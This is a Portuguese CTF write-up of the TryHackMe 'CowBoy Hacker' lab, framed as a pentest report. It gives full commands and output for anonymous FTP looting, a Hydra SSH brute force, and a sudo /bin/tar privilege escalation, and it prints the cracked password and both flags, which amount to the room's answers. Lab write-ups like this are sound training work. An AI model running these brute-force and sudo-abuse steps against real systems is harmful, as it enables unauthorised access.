# 🤠 CowBoy Hacker — CTF Writeup
### TryHackMe | Boot-to-Root | Exfiltração via FTP Anônimo · Força Bruta SSH (Hydra) · Escalada de Privilégios via sudo tar

---

| **Analista**          | Mauricio Robert                                                                        |
|-----------------------|----------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                      |
| **Data do Relatório** | 25/07/2026                                                                             |
| **Data do Pentest**   | 25/07/2026 · 03:55 – 04:13 (GMT+0)                                                     |
| **Alvo**              | `10.65.150.38` / `10.67.164.213` — TryHackMe · CowBoy Hacker                           |
| **Classificação**     | CONFIDENCIAL                                                                           |
| **Ferramentas**       | Nmap 7.99 · Cliente FTP · Hydra 9.7 · OpenSSH · tar (GTFOBins)                        |
| **Plataforma**        | TryHackMe — Boot-to-Root                                                               |

---

## 🔍 Resumo Executivo

Este relatório documenta o comprometimento completo da máquina **CowBoy Hacker** (TryHackMe), um host **Ubuntu Linux**, em aproximadamente **18 minutos**, por meio de uma cadeia de ataque encadeando reconhecimento de rede, exfiltração de arquivos sensíveis através de um serviço **FTP com login anônimo habilitado**, construção de uma wordlist de senhas customizada a partir dos arquivos exfiltrados, ataque de **força bruta SSH** com Hydra, acesso inicial como o usuário `lin` e escalada de privilégios explorando uma permissão **sudo mal configurada** para o binário `/bin/tar`. Nenhuma vulnerabilidade CVE foi necessária — o comprometimento total dependeu exclusivamente de **falhas de configuração** (FTP anônimo, senha fraca reutilizada e sudoers mal configurado). As flags `user.txt` e `root.txt` foram capturadas com sucesso, confirmando o comprometimento total (root) do sistema.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta         | Versão  | Finalidade                                                                          |
|---------------------|---------|----------------------------------------------------------------------------------|
| **Nmap**            | 7.99    | Varredura de portas e fingerprinting de serviços (`-A -sC -p-`)                    |
| **Cliente FTP**     | -       | Enumeração e exfiltração de arquivos do serviço vsftpd (login anônimo)             |
| **Hydra**           | 9.7     | Força bruta SSH com wordlist customizada (`locks.txt`)                             |
| **OpenSSH**         | client  | Acesso remoto à máquina alvo como usuário `lin`                                    |
| **tar / GTFOBins**  | -       | Escalada de privilégios via `sudo NOPASSWD` em `/bin/tar`                          |

---

## 📋 Fases de Comprometimento

### FASE 1 — Reconhecimento: Varredura Nmap

> **03:55 GMT+0 · Nmap 7.99 · Alvo: 10.65.150.38**

Uma primeira varredura sem privilégios elevados não retornou portas abertas (todas ignoradas/filtradas). A repetição com privilégios de root revelou os serviços expostos:

**Comando final:**
```bash
sudo nmap -A -Pn -n -sC -T4 --min-rate 5000 --max-retries 1 -p- 10.65.150.38
```
![Nmap](/CTFs/Cowboy%20Hacker/images/Scan_Nmap.png)
```
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
```

O script `ftp-anon` confirmou explicitamente que o **acesso anônimo ao FTP era permitido**, embora a listagem via modo ativo (PASV) tenha sido inicialmente negada — um convite direto para a próxima fase.

---

### FASE 2 — Enumeração FTP: Exfiltração de Arquivos

> **04:05 GMT+0 · ftp 10.67.164.213**

Com o login anônimo confirmado, a conexão ao FTP foi estabelecida com sucesso:

```bash
ftp 10.67.164.213
Name (10.67.164.213:nistezy): anonymous
230 Login successful.
```

A listagem do diretório revelou dois arquivos de interesse imediato:

```
-rw-rw-r-- 1 ftp ftp 418 Jun 07 2020 locks.txt
-rw-rw-r-- 1 ftp ftp  68 Jun 07 2020 task.txt
```

**Comandos:**
```
get locks.txt
get task.txt
exit
```

O arquivo **`task.txt`** continha uma lista de tarefas com referências temáticas (a série Cowboy Bebop), assinada ao final pelo usuário do sistema:

```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
![Username](/CTFs/Cowboy%20Hacker/images/FTP_Extrafilation.png)
> 🚩 **Username identificado (task.txt): `lin`**

Já o arquivo **`locks.txt`** continha uma extensa lista de variações de senha com padrões de leetspeak em torno de "Dragon Syndicate":

```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
...
RedDr4gonSynd1cat3
...
```

Uma **wordlist customizada e direcionada** — clara pista para um ataque de força bruta subsequente.

---

### FASE 3 — Força Bruta SSH: Hydra

> **04:12 GMT+0 · Hydra 9.7**

Com o username (`lin`) e a wordlist de senhas (`locks.txt`) obtidos na fase de exfiltração FTP, o Hydra foi utilizado para o ataque de força bruta contra o SSH:

**Comando:**
```bash
hydra -l lin -P locks.txt 10.67.164.213 ssh
```

```
[DATA] attacking ssh://10.67.164.213:22/
[22][ssh] host: 10.67.164.213   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
```

De um total de 26 tentativas, a credencial válida foi encontrada em poucos segundos.

![Hydra](/CTFs/Cowboy%20Hacker/images/Hydra_and_SSH.png)
> 🚩 **Credencial SSH válida: `lin : RedDr4gonSynd1cat3`**

---

### FASE 4 — Acesso Inicial: SSH + Captura de user.txt

> **04:13 GMT+0 · ssh lin@10.67.164.213**

Com as credenciais obtidas, o login SSH foi estabelecido com sucesso:

```
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)

lin@ip-10-67-164-213:~/Desktop$ ls
user.txt

lin@ip-10-67-164-213:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```
![User.txt](/CTFs/Cowboy%20Hacker/images/User.txt.png)
> 🚩 **user.txt — FLAG CAPTURADA: `THM{CR1M3_SyNd1C4T3}`**

---

### FASE 5 — Escalada de Privilégios: sudo /bin/tar + Captura de root.txt

> **04:14 GMT+0 · sudo -l + GTFOBins (tar)**

O comando `sudo -l` revelou a configuração insegura de sudo:

```
User lin may run the following commands on ip-10-67-164-213:
    (root) /bin/tar
```

O usuário `lin` podia executar o binário **`tar`** como root, **sem restrição de argumentos**. Consultando o GTFOBins, o `tar` permite tanto a leitura de arquivos arbitrários (compactando-os para um local acessível) quanto a execução de comandos arbitrários como root. A técnica aplicada consistiu em compactar o arquivo `root.txt` (protegido, legível apenas por root) em um `.tar` de propriedade do usuário atual e, em seguida, extraí-lo para leitura:

```bash
lin@ip-10-67-164-213:~/Desktop$ sudo /bin/tar -cf /tmp/root.tar /root/root.txt
/bin/tar: Removing leading `/' from member names

lin@ip-10-67-164-213:~/Desktop$ tar -tf /tmp/root.tar
root/root.txt

lin@ip-10-67-164-213:~/Desktop$ mkdir /tmp/extract
lin@ip-10-67-164-213:~/Desktop$ tar -xf /tmp/root.tar -C /tmp/extract

lin@ip-10-67-164-213:~/Desktop$ cat /tmp/extract/root/root.txt
THM{80UN7Y_h4cK3r}
```
![Root](/CTFs/Cowboy%20Hacker/images/Root.txt.png)
> 🚩 **root.txt — FLAG CAPTURADA: `THM{80UN7Y_h4cK3r}`**

---

## ⛓ Linha do Tempo do Comprometimento

```
[03:55 GMT+0] FASE 1 — RECONHECIMENTO (Nmap 7.99)
    Scan -A -Pn -sC -T4 -p- sobre 10.65.150.38
    Portas abertas: 21/FTP (anônimo) · 22/SSH · 80/HTTP
    ↓
[04:05 GMT+0] FASE 2 — ENUMERAÇÃO FTP
    ftp anonymous → locks.txt (wordlist) + task.txt (username "lin")
    Wordlist temática: variações leetspeak de "Dragon Syndicate"
    ↓
[04:12 GMT+0] FASE 3 — FORÇA BRUTA SSH (Hydra 9.7)
    hydra -l lin -P locks.txt 10.67.164.213 ssh
    CREDENCIAL ENCONTRADA: lin:RedDr4gonSynd1cat3
    ↓
[04:13 GMT+0] FASE 4 — ACESSO INICIAL (SSH)
    ssh lin@10.67.164.213 · Ubuntu 20.04.6 LTS
    FLAG user.txt: THM{CR1M3_SyNd1C4T3} ✓
    ↓
[04:14 GMT+0] FASE 5 — ESCALADA DE PRIVILÉGIOS (sudo tar)
    sudo -l → (root) /bin/tar
    sudo tar -cf root.tar /root/root.txt → extração local
    FLAG root.txt: THM{80UN7Y_h4cK3r} ✓
    ↓
[04:14 GMT+0] COMPROMETIMENTO TOTAL — root@ip-10-67-164-213
    Duração total: ~18 minutos
```

---

## 🗺 Mapeamento Investigativo

| Fase | Ferramenta/Técnica | Achado |
|------|--------------------|--------|
| Reconhecimento | Nmap 7.99 (`-A -sC -p-`) | FTP anônimo, SSH e Apache identificados |
| Enumeração FTP | Cliente FTP (anonymous) | `locks.txt` (wordlist) e `task.txt` (username `lin`) |
| Força Bruta SSH | Hydra 9.7 | Credencial: `lin : RedDr4gonSynd1cat3` |
| Acesso Inicial | OpenSSH | Login como `lin`; `user.txt` capturado |
| Escalada de Privilégio | `sudo` + GTFOBins (`tar`) | `(root) /bin/tar` sem restrição → leitura de `root.txt` |

---

## 🚨 Artefatos e Indicadores Identificados

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Alvo | `10.65.150.38` / `10.67.164.213` | Máquina CowBoy Hacker (TryHackMe) — Ubuntu 20.04.6 LTS |
| Serviços expostos | `21/TCP` (vsftpd 3.0.5, anônimo) · `22/TCP` (OpenSSH 8.2p1) · `80/TCP` (Apache 2.4.41) | Superfície de ataque inicial |
| Arquivo exfiltrado | `locks.txt` | Wordlist customizada de senhas (variações de "Dragon Syndicate") |
| Arquivo exfiltrado | `task.txt` | Revela o username válido `lin` |
| Credencial comprometida | `lin : RedDr4gonSynd1cat3` | Obtida via Hydra a partir da wordlist exfiltrada |
| Configuração sudo insegura | `(root) /bin/tar` sem restrição de argumentos | Permite leitura arbitrária de arquivos via GTFOBins |
| Técnica de escalada | Compactação/extração via `tar` | Leitura de `/root/root.txt` sem shell root completa |
| Flag user | `THM{CR1M3_SyNd1C4T3}` | `~/Desktop/user.txt` |
| Flag root | `THM{80UN7Y_h4cK3r}` | `/root/root.txt` |
| Técnica (MITRE ATT&CK) | `T1110.001` | Brute Force: Password Guessing |
| Técnica (MITRE ATT&CK) | `T1552.001` | Unsecured Credentials: Credentials In Files |
| Técnica (MITRE ATT&CK) | `T1548.003` | Abuse Elevation Control: Sudo and Sudo Caching |

---

## ✅ Resumo das Flags

| # | Flag | Valor |
|---|------|-------|
| 🚩 user.txt | `~/Desktop/user.txt` | `THM{CR1M3_SyNd1C4T3}` |
| 🚩 root.txt | `/root/root.txt` | `THM{80UN7Y_h4cK3r}` |

---

## 📚 Referências

- [TryHackMe — CowBoy Hacker](https://tryhackme.com/room/cowboyhacker)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [THC-Hydra — Van Hauser](https://github.com/vanhauser-thc/thc-hydra)
- [GTFOBins — tar](https://gtfobins.github.io/gtfobins/tar/)
- [MITRE ATT&CK T1110.001 — Brute Force: Password Guessing](https://attack.mitre.org/techniques/T1110/001/)
- [MITRE ATT&CK T1552.001 — Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
- [MITRE ATT&CK T1548.003 — Abuse Elevation Control: Sudo and Sudo Caching](https://attack.mitre.org/techniques/T1548/003/)

---